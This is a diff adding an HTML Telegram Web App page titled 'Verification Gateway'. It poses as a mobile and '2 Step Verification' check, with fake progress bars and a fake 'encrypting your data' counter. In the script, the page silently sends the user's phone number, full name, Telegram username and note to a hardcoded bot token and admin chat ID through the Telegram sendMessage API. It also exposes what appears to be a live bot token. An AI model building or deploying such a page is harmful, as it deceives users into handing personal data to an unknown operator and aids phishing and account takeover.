@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Gateway</title>
+    <!-- Telegram Web App SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <!-- Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --bg-color: #0f172a;
+            --card-bg: #1e293b;
+            --text-main: #ffffff;
+            --text-sub: #94a3b8;
+            --primary: #3b82f6; /* Blue */
+            --success: #10b981; /* Green */
+            --error: #ef4444;   /* Red */
+            --glow-color: rgba(59, 130, 246, 0.5);
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg-color);
+            font-family: 'Poppins', sans-serif;
+            color: var(--text-main);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            overflow: hidden;
+            user-select: none;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 380px;
+            position: relative;
+        }
+
+        /* --- CARD STYLES --- */
+        .card {
+            background: var(--card-bg);
+            border: 1px solid #334155;
+            border-radius: 20px;
+            padding: 30px 20px;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+            display: none; /* Hidden by default */
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        .card.active {
+            display: block;
+        }
+
+        h2 { font-size: 20px; margin-bottom: 10px; font-weight: 700; }
+        p { font-size: 13px; color: var(--text-sub); margin-bottom: 25px; line-height: 1.5; }
+
+        /* --- INPUTS --- */
+        .input-group { text-align: left; margin-bottom: 15px; }
+        label { font-size: 12px; color: var(--text-sub); display: block; margin-bottom: 5px; }
+        
+        input, textarea {
+            width: 100%;
+            background: #0b1120;
+            border: 1px solid #334155;
+            padding: 12px;
+            border-radius: 10px;
+            color: white;
+            font-family: inherit;
+            box-sizing: border-box;
+            outline: none;
+            transition: 0.3s;
+        }
+        input:focus, textarea:focus { 
+            border-color: var(--primary); 
+            box-shadow: 0 0 10px rgba(59, 130, 246, 0.2); 
+        }
+
+        /* --- BUTTONS --- */
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 12px;
+            background: var(--primary);
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 15px;
+            transition: transform 0.1s;
+            margin-top: 10px;
+        }
+        .btn:active { transform: scale(0.97); }
+
+        /* --- ERROR BOX --- */
+        .error-msg {
+            background: rgba(239, 68, 68, 0.15);
+            color: var(--error);
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 12px;
+            margin-bottom: 15px;
+            display: none;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            text-align: left;
+        }
+
+        /* --- LOADING BAR (0-100) --- */
+        .progress-track {
+            background: #334155;
+            height: 8px;
+            border-radius: 10px;
+            margin: 20px 0 10px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            background: var(--primary);
+            width: 0%;
+            border-radius: 10px;
+            transition: width 0.1s linear;
+        }
+
+        /* --- EMOJI ANIMATION --- */
+        .circle-container {
+            width: 140px;
+            height: 140px;
+            margin: 0 auto 25px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        /* Outer Glowing Ring */
+        .outer-ring {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 4px solid transparent;
+            border-top-color: var(--primary);
+            border-bottom-color: var(--primary);
+            animation: spinRing 2s linear infinite;
+            box-shadow: 0 0 30px rgba(59, 130, 246, 0.2);
+        }
+
+        /* Emoji Moving Wildly */
+        .emoji-wrapper {
+            font-size: 50px;
+            position: relative;
+            z-index: 2;
+            animation: moveWildly 2s ease-in-out infinite alternate;
+        }
+
+        /* --- SUCCESS ICON --- */
+        .success-icon {
+            font-size: 60px;
+            color: var(--success);
+            margin-bottom: 20px;
+            animation: popUp 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        /* --- ANIMATIONS --- */
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes spinRing { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes popUp { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+        
+        @keyframes moveWildly {
+            0% { transform: translate(0, 0); }
+            20% { transform: translate(-25px, -15px); }
+            40% { transform: translate(20px, 20px); }
+            60% { transform: translate(-15px, 25px); }
+            80% { transform: translate(25px, -10px); }
+            100% { transform: translate(0, 0); }
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <!-- STEP 1: INPUT NUMBER -->
+        <div id="step-1" class="card active">
+            <div style="font-size: 40px; color: var(--primary); margin-bottom: 15px;">
+                <i class="fa-solid fa-mobile-screen-button"></i>
+            </div>
+            <h2>Verify Mobile</h2>
+            <p>Enter your mobile number to check eligibility.</p>
+            
+            <div id="error-box" class="error-msg">
+                <i class="fa-solid fa-triangle-exclamation"></i> This number is already used by another user.
+            </div>
+
+            <div class="input-group">
+                <input type="tel" id="phoneNumber" placeholder="+91 98765 43210">
+            </div>
+            <button class="btn" onclick="checkNumber()">Verify Now</button>
+        </div>
+
+        <!-- STEP 2: LOADING (0-100%) -->
+        <div id="step-2" class="card">
+            <h2>Checking Database...</h2>
+            <div class="progress-track">
+                <div class="progress-fill" id="bar-100"></div>
+            </div>
+            <p id="text-100" style="font-size: 12px; margin-top: 5px;">0%</p>
+        </div>
+
+        <!-- STEP 3: 2-STEP BUTTON -->
+        <div id="step-3" class="card">
+            <div style="font-size: 40px; color: var(--success); margin-bottom: 15px;">
+                <i class="fa-solid fa-shield-halved"></i>
+            </div>
+            <h2>Number Available!</h2>
+            <p>Your number is valid. Please proceed.</p>
+            <button class="btn" onclick="nextScreen('step-3', 'step-4')">2 Step Verification</button>
+        </div>
+
+        <!-- STEP 4: USER DETAILS FORM -->
+        <div id="step-4" class="card">
+            <h2>User Details</h2>
+            <p>Fill in your details to secure the account.</p>
+
+            <div class="input-group">
+                <label>Full Name</label>
+                <input type="text" id="inpName" placeholder="John Doe">
+            </div>
+            <div class="input-group">
+                <label>Telegram Username</label>
+                <input type="text" id="inpUser" placeholder="@username">
+            </div>
+            <div class="input-group">
+                <label>Times bot used?</label>
+                <input type="number" id="inpCount" placeholder="0">
+            </div>
+            <div class="input-group">
+                <label>Note (Optional)</label>
+                <textarea id="inpNote" rows="2" placeholder="Any message..."></textarea>
+            </div>
+
+            <button class="btn" onclick="submitDetails()">Verification</button>
+        </div>
+
+        <!-- STEP 5: EMOJI ANIMATION (0-200) -->
+        <div id="step-5" class="card">
+            <div class="circle-container">
+                <div class="outer-ring"></div>
+                <div class="emoji-wrapper">🧐</div>
+            </div>
+            <h2>Finalizing Security</h2>
+            <p>Please wait while we encrypt your data...</p>
+            
+            <h1 id="counter-200" style="font-size: 32px; color: var(--primary); margin: 0;">0</h1>
+            <span style="font-size: 12px; color: #64748b;">/ 200 Checks</span>
+        </div>
+
+        <!-- STEP 6: SUCCESS -->
+        <div id="step-6" class="card">
+            <div class="success-icon">
+                <i class="fa-solid fa-circle-check"></i>
+            </div>
+            <h2>Verification Done ✅</h2>
+            <p>Thanks for using our bot. Your session is now active.</p>
+            <button class="btn" style="background-color: var(--success); color: #000;" onclick="finishProcess()">Continue to Bot</button>
+        </div>
+
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand(); 
+
+        // ================= CONFIGURATION =================
+        // UPDATED WITH YOUR DETAILS
+        const BOT_TOKEN = "8553090176:AAHDSKNY_RAm9EeUzeY6aNqt4neW01g830s"; 
+        const ADMIN_ID = "7006020429"; 
+        // =================================================
+
+        const USED_DB = ['1234567890', '1111111111']; 
+
+        // --- 1. CHECK NUMBER ---
+        function checkNumber() {
+            const phone = document.getElementById('phoneNumber').value.replace(/\D/g,'');
+            const errorBox = document.getElementById('error-box');
+
+            if(phone.length < 5) {
+                tg.HapticFeedback.notificationOccurred('warning');
+                alert("Please enter a valid number");
+                return;
+            }
+
+            if(USED_DB.includes(phone)) {
+                errorBox.style.display = 'block';
+                tg.HapticFeedback.notificationOccurred('error');
+            } else {
+                errorBox.style.display = 'none';
+                tg.HapticFeedback.impactOccurred('light');
+                nextScreen('step-1', 'step-2');
+                startLoading100();
+            }
+        }
+
+        // --- 2. LOADING 0-100% ---
+        function startLoading100() {
+            let p = 0;
+            const bar = document.getElementById('bar-100');
+            const txt = document.getElementById('text-100');
+
+            const interval = setInterval(() => {
+                p += Math.floor(Math.random() * 5) + 3;
+                if(p > 100) p = 100;
+                bar.style.width = p + '%';
+                txt.innerText = p + '%';
+                if(p === 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        nextScreen('step-2', 'step-3');
+                        tg.HapticFeedback.notificationOccurred('success');
+                    }, 500);
+                }
+            }, 60);
+        }
+
+        // --- 3. SUBMIT & SEND INSTANTLY ---
+        function submitDetails() {
+            const name = document.getElementById('inpName').value;
+            const user = document.getElementById('inpUser').value;
+            const count = document.getElementById('inpCount').value;
+            const note = document.getElementById('inpNote').value;
+            const phone = document.getElementById('phoneNumber').value; 
+
+            if(!name || !user) {
+                tg.HapticFeedback.notificationOccurred('error');
+                alert("Please fill in required fields.");
+                return;
+            }
+
+            // Prepare Message
+            const messageText = `📦 <b>New 2-Step Verification</b>%0A%0A` +
+                                `👤 <b>Name:</b> ${name}%0A` +
+                                `📱 <b>Phone:</b> ${phone}%0A` +
+                                `🆔 <b>Username:</b> ${user}%0A` +
+                                `🔢 <b>Used Count:</b> ${count}%0A` +
+                                `📝 <b>Note:</b> ${note}`;
+
+            // Send to Telegram API (Using your specific token)
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${messageText}&parse_mode=HTML`;
+
+            // Background send
+            fetch(url).catch(err => console.error(err));
+
+            // Proceed to Animation
+            nextScreen('step-4', 'step-5');
+            startCounter200();
+        }
+
+        // --- 4. COUNTER 0-200 (12s to 20s) ---
+        function startCounter200() {
+            const counterEl = document.getElementById('counter-200');
+            const target = 200;
+            
+            // Random duration between 12s (12000ms) and 20s (20000ms)
+            const duration = Math.floor(Math.random() * (20000 - 12000 + 1) + 12000);
+            const intervalTime = duration / target;
+            let current = 0;
+
+            const timer = setInterval(() => {
+                current++;
+                counterEl.innerText = current;
+                if(current % 25 === 0) changeEmoji();
+
+                if(current >= target) {
+                    clearInterval(timer);
+                    setTimeout(() => {
+                        nextScreen('step-5', 'step-6');
+                        tg.HapticFeedback.notificationOccurred('success');
+                    }, 800);
+                }
+            }, intervalTime);
+        }
+
+        function changeEmoji() {
+            const emojis = ['🤑', '😎', '🧐', '🤖', '👻', '👺', '👽'];
+            const el = document.querySelector('.emoji-wrapper');
+            el.innerText = emojis[Math.floor(Math.random() * emojis.length)];
+        }
+
+        // --- 5. FINISH ---
+        function finishProcess() {
+            // Send command back to the bot
+            tg.sendData("/kpgverified");
+            tg.close();
+        }
+
+        // --- UTILS ---
+        function nextScreen(hideId, showId) {
+            document.getElementById(hideId).classList.remove('active');
+            document.getElementById(showId).classList.add('active');
+        }
+    </script>
+</body>
+</html>
